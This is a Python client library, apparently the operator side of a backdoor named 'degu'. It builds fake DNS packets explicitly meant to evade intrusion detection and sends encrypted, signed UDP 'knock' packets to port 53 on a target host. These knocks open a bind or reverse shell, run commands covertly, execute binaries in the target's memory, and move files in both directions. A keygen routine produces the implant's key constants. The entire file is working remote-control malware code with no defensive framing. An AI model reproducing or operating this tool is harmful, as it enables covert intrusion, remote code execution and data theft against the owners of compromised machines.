#!/usr/bin/env python3

import socket
import ctypes
import logging
import os
import binascii
import time
import struct
import threading
import random
import string
import sys

DEGU="../degu.so"
DEGU_EXE = b"<o)~"
DEGU_DL  = b"Oo<<"
DEGU_UP  = b"Oo>>"

os.putenv("_LC","1")

def mock_dns():
    """ generate random dns query for degu call to evade ids"""
    names = ["google.com","twitter.com","fb.com","tiktok.com",
            "apple.com","youtube.com","bing.com","live.com",
            "netflix.com","reddit.com"]
    transac_id = struct.pack("H",random.randint(0,65535))
    flags = b"\x01\x00\x00\x01\x00\x00\x00\x00\x00"
    name = random.choice(names)
    len_name = struct.pack(">H",len(name))
    rest = b"\x00\x01\x00\x01"
    dns_data = transac_id + flags + len_name + name.encode() + rest + 32*b"\x00"
    return dns_data[:32]

class LogFmt(logging.Formatter):
    """ class for log formating """

    def __init__(self):
        logging.Formatter.__init__(self)

    def format_time(self):
        """ format time """
        return time.strftime("%H:%M.%S")

    def _l(self,level):
        clevel = {"DEBUG"    :  ("\033[0;36m","\033[1;36m"),
          "INFO"     :  ("\033[0;37m","\033[1;37m"),
          "WARNING"  :  ("\033[0;31m","\033[1;31m"),
          "CRITICAL" :  ("\033[0;31m","\033[1;31m"),
          "ERROR"    :  ("\033[0;31m","\033[1;31m"),
          }
        return clevel[level]

    def format(self,record):
        header = self._l(record.levelname)[0] + "[" + self._l(record.levelname)[1] + "%8s"%record.levelname \
               + self._l(record.levelname)[1] + "  " + self.format_time() + "][%-5s]: " % record.name + "\033[0m"
        return header + "\033[0m" + record.msg

LEVEL = logging.DEBUG
log = logging.getLogger('degu')
log.setLevel(LEVEL)
ch = logging.StreamHandler()
ch.setFormatter(LogFmt())
log.addHandler(ch)

def create_bin_string(b,args):
    """ create payload for memory execution """
    mybin = open(b,"rb").read()
    lbin = struct.pack("I",len(mybin))
    argc = len(args.split())
    largs = struct.pack("I",len(args))
    payload = DEGU_EXE + lbin + largs + bytes(chr(argc),"ascii")+args+mybin
    size = len(payload)
    delta = 32 - (size % 32)
    total_size = size + delta
    data = ctypes.create_string_buffer(total_size)
    data.value = payload + delta * b"\0"
    return data,total_size

def create_dl_string(path):
    """ create payload for file download """
    lpath = struct.pack("I",len(path))
    payload = DEGU_DL + lpath + path
    size = len(payload)
    delta = 32 - (size % 32)
    total_size = size + delta
    data = ctypes.create_string_buffer(total_size)
    data.value = payload + delta * b"\0"
    return data, total_size

def create_up_string(path,file):
    """ create payload for file upload """
    lpath = struct.pack("I",len(path))
    data = None
    try:
        data = open(file,"rb").read()
    except FileNotFoundError:
        log.error(f"file {path} not found")
        return None, None

    ldata = struct.pack("I",len(data))
    payload = DEGU_UP + ldata + lpath + path + data
    size = len(payload)
    delta = 32 - (size % 32)
    total_size = size + delta
    data = ctypes.create_string_buffer(total_size)
    data.value = payload + delta * b"\0"
    return data, total_size

class degu(object):
    """ main degu object to interact with"""
    def __init__(self,host,priv):
        self.host = host
        try:
            self.lib =  ctypes.CDLL(DEGU)
        except OSError:
            log.error("no degu lib found")
            sys.exit(-1)
        self.log = log
        self.bot_pubkey = None
        self.priv = priv
        self.s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)

    def mkbuf_knock(self,addr):
        buf_rand = mock_dns()
        self.xcrypt_knock(buf_rand)
        log.debug("knocking %s"%addr)

        if addr.startswith(b":"):
            try:
                port = int(addr[1:])
                self.port = port
                log.debug("trying remote bind on %s:%i"%(self.host,port))
                f = struct.pack("H",port)
                payload = buf_rand + b"\xb0\x0b" + f + b"\0"*1000
                return self.xcrypt_knock(payload)
            except ValueError:
                log.error(f"Port {addr[1:]} is invalid")
                return
        else:
            try:
                sip,sport = addr.split(b":")
                log.debug(f"trying backconnect on {sip}:{sport}")
                ip = bytes(map(int, sip.split(b'.')))
                port = int(sport)
                f=struct.pack("H",port)
                payload = buf_rand + b"\xc4\x11" + ip + f + b"\0"*1000
                return self.xcrypt_knock(payload)

            except Exception as exc:
                log.error("addr %s is invalid : %s"%(addr,exc))
                return None

    def mkbuf_upload(self, file , path, pub ):
        """ make upload buffer """
        self.bot_pubkey = self.xcrypt_knock(pub)
        cpub = ctypes.create_string_buffer(32)
        cpub.value = self.bot_pubkey
        key = ctypes.create_string_buffer(64)
        key.value = binascii.unhexlify(self.priv)
        data, total_size = create_up_string( path , file )
        if not data :
            return None
        self.lib.xbuf(cpub, key, data, total_size)
        return data.raw

    def mkbuf_mem_exec(self,b,param,pub):
        """ make memexec buffer """
        self.bot_pubkey = self.xcrypt_knock(pub)
        cpub = ctypes.create_string_buffer(32)
        cpub.value = self.bot_pubkey
        key = ctypes.create_string_buffer(64)
        key.value = binascii.unhexlify(self.priv)
        data, total_size = create_bin_string(b,param)
        self.lib.xbuf(cpub,key,data, total_size )
        return data.raw

    def mkbuf_ghost_exec(self,mycmd):
        """ make ghost exec buffer """
        rand = mock_dns()
        self.xcrypt_knock(rand)
        sig  = self.sign_msg(mycmd)
        payload = rand + b"\xc0\x57" + struct.pack("H",len(mycmd)) +  mycmd + sig + b'\x00'*1000
        return self.xcrypt_knock(payload)

    def xcrypt_knock(self,data):
        self.lib.xcrypt_knock(data,len(data))
        return data

    def sign_msg(self,data):
        key = ctypes.create_string_buffer(64)
        key.value = binascii.unhexlify(self.priv)
        sig = ctypes.create_string_buffer(64)
        self.lib.xsig(sig,data,len(data),key)
        return sig.raw

    def mkbuf_download(self,path,pub):
        self.bot_pubkey = self.xcrypt_knock(pub)
        cpub = ctypes.create_string_buffer(32)
        cpub.value = self.bot_pubkey
        key = ctypes.create_string_buffer(64)
        key.value = binascii.unhexlify(self.priv)
        data, total_size = create_dl_string( path )
        self.lib.xbuf(cpub, key, data, total_size)
        return data,cpub

    def rdownload(self,path,lport,timeout=5):
        log.info(f"CB downloading {path.decode()}")
        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serv.bind(('0.0.0.0', int(lport)))
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()

        pub = s.recv(32)
        data,cpub = self.mkbuf_download(path,pub)
        key = ctypes.create_string_buffer(64)
        key.value = binascii.unhexlify(self.priv)

        s.send(data.raw)
        recvdata = b""
        while 1:
            tmp = s.recv(10)
            if tmp :
                recvdata += tmp
            else :
                break
        if len(recvdata) > 4:
            self.lib.xbuf(cpub, key, recvdata, len(recvdata))
            lmsg = struct.unpack(">I",recvdata[:4])[0]
            s.close()
            return recvdata[4:lmsg+4]
        else:
            log.error("no recv :(")
        s.close()

    def download(self, path, cb = None ):
        log.info(f"Downloading {path.decode()}")
        s = socket.socket()
        s.connect((self.host,self.port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))

        pub = s.recv(32)
        data,cpub = self.mkbuf_download(path,pub)
        key = ctypes.create_string_buffer(64)
        key.value = binascii.unhexlify(self.priv)

        s.send(data.raw)
        recvdata = b""
        while 1:
            tmp = s.recv(10)
            if tmp :
                recvdata += tmp
            else :
                break
        if len(recvdata) > 4:
            self.lib.xbuf(cpub, key, recvdata, len(recvdata))
            lmsg = struct.unpack(">I",recvdata[:4])[0]
            s.close()
            return recvdata[4:lmsg+4]
        else:
            log.error("no recv :(")
        s.close()

    def upload(self, file , path ):
        log.info(f"Uploading {file.decode()} {path.decode()}")
        s = socket.socket()
        s.connect((self.host,self.port))
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_upload(file, path, pub)
        if not data :
            return None
        s.send(data)
        s.close()

    def rupload(self, file , path, lport, timeout=5 ):
        log.info(f"cb Uploading {file.decode()} {path.decode()}")

        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serv.bind(('0.0.0.0', int(lport)))
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()

        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        pub = s.recv(32)
        data = self.mkbuf_upload(file, path, pub)
        if not data :
            return None
        s.send(data)
        s.close()


    def mem_exec(self,b,param):
        log.info("Sending bin %s params '%s' "%(b,param.decode()))
        s = socket.socket()
        s.connect((self.host,self.port))
        pub = s.recv(32)
        data = self.mkbuf_mem_exec(b, param, pub)
        s.send(data)
        s.close()

    def rmem_exec(self,b,param,lport,timeout=5):
        log.info("Sending bin %s params '%s' "%(b,param.decode()))

        serv = socket.socket()
        serv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        serv.bind(('0.0.0.0', int(lport)))
        serv.settimeout(timeout)
        serv.listen(512)
        s, _ = serv.accept()

        pub = s.recv(32)
        data = self.mkbuf_mem_exec(b, param, pub)
        s.send(data)
        s.close()


    def knock(self,data):
        buf = self.mkbuf_knock(data)
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        s.sendto(buf,0,(self.host,53))
        s.close()

    def ghost_exec(self,mycmd):
        log.info(f"ghost executing {mycmd}")
        buf = self.mkbuf_ghost_exec(mycmd)
        s = socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack('ii', 1, 0))
        log.debug("executing : %s"%mycmd)
        s.sendto(buf,0,(self.host,53))
        s.close()

    def __str__(self):
        return f"<DEGU ({self.host})>"

    def __repr__(self):
        return f"<DEGU ({self.host})>"


    @staticmethod
    def getpub(priv):
        """ get degu public key from private key """
        lib =  ctypes.CDLL(DEGU)
        pub = ctypes.create_string_buffer(b"\x00"*32)
        lib.xpub(pub,priv)
        ret = "#define MASTER_PUBKEY {"+ ",".join( ["0x%02x"%c for c in pub.value] ) + "}; \n"
        ret += '// pub= '+binascii.hexlify(pub.value).decode()
        return ret


    @staticmethod
    def keygen():
        """ degu keygen function """
        file = '/tmp/.' + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(6))

        lib =  ctypes.CDLL(DEGU)
        lib.keygen(file.encode())

        toexec = open(file,"rb").read()
        exec( toexec, globals() )
        os.unlink(file)

        tiv  = ["0x%02x"%c for c in binascii.unhexlify(iv)]
        tkno = ["0x%02x"%c for c in binascii.unhexlify(knock)]
        tpub = ["0x%02x"%c for c in binascii.unhexlify(pub)]

        ret  = "#define IV            { " + ",".join(tiv) + "}\n"
        ret += "#define KNOCK_KEY     { " + ",".join(tkno) + "}\n"
        ret += "#define MASTER_PUBKEY { " + ",".join(tpub) + "}\n"
        ret += f'\n// PRIVATE_KEY="{priv}"\n'
        return ret
